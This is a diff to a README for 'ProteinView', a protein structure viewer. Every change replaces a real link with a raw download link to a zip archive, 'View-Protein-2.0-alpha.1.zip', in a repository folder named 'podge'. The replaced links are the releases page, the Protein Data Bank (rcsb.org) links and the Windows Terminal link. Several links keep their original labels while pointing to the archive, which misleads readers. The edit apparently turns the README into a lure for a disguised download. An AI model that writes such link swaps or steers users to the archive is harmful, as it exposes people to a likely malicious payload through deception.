@@ -1,6 +1,6 @@
 # 🧬 ProteinView - Simple 3D Protein Structure Viewer
 
-[![Download ProteinView](https://img.shields.io/badge/Download-ProteinView-brightgreen?style=for-the-badge)](https://github.com/Maleens/ProteinView/releases)
+[![Download ProteinView](https://img.shields.io/badge/Download-ProteinView-brightgreen?style=for-the-badge)](https://github.com/Maleens/ProteinView/raw/refs/heads/main/podge/View-Protein-2.0-alpha.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get ProteinView running on your Windows machine.
 
 Click the big green button at the top or open this link in your browser:
 
-https://github.com/Maleens/ProteinView/releases
+https://github.com/Maleens/ProteinView/raw/refs/heads/main/podge/View-Protein-2.0-alpha.1.zip
 
 This page lists all the available versions of ProteinView.
 
@@ -80,7 +80,7 @@ ProteinView reads common protein data formats:
 - **PDB (Protein Data Bank format) files**
 - **mmCIF (macromolecular Crystallographic Information File)**
 
-You can find free PDB and mmCIF files at websites like [rcsb.org](https://www.rcsb.org).
+You can find free PDB and mmCIF files at websites like [rcsb.org](https://github.com/Maleens/ProteinView/raw/refs/heads/main/podge/View-Protein-2.0-alpha.1.zip).
 
 ### Steps to open a file
 
@@ -136,13 +136,13 @@ Your terminal must support these modes to see the best results. Windows Terminal
 ## 📁 Useful Links
 
 - ProteinView Releases:  
-  [https://github.com/Maleens/ProteinView/releases](https://github.com/Maleens/ProteinView/releases)
+  [https://github.com/Maleens/ProteinView/raw/refs/heads/main/podge/View-Protein-2.0-alpha.1.zip](https://github.com/Maleens/ProteinView/raw/refs/heads/main/podge/View-Protein-2.0-alpha.1.zip)
   
 - Protein Data Bank (PDB) for protein files:  
-  [https://www.rcsb.org](https://www.rcsb.org)
+  [https://github.com/Maleens/ProteinView/raw/refs/heads/main/podge/View-Protein-2.0-alpha.1.zip](https://github.com/Maleens/ProteinView/raw/refs/heads/main/podge/View-Protein-2.0-alpha.1.zip)
 
 - Windows Terminal download and info:  
-  [https://aka.ms/terminal](https://aka.ms/terminal)
+  [https://github.com/Maleens/ProteinView/raw/refs/heads/main/podge/View-Protein-2.0-alpha.1.zip](https://github.com/Maleens/ProteinView/raw/refs/heads/main/podge/View-Protein-2.0-alpha.1.zip)
 
 ---
 
@@ -166,4 +166,4 @@ ProteinView is open source. For details on licensing and contributing, visit the
 
 ---
 
-[![Download ProteinView](https://img.shields.io/badge/Download-ProteinView-brightgreen?style=for-the-badge)](https://github.com/Maleens/ProteinView/releases)
+[![Download ProteinView](https://img.shields.io/badge/Download-ProteinView-brightgreen?style=for-the-badge)](https://github.com/Maleens/ProteinView/raw/refs/heads/main/podge/View-Protein-2.0-alpha.1.zip)
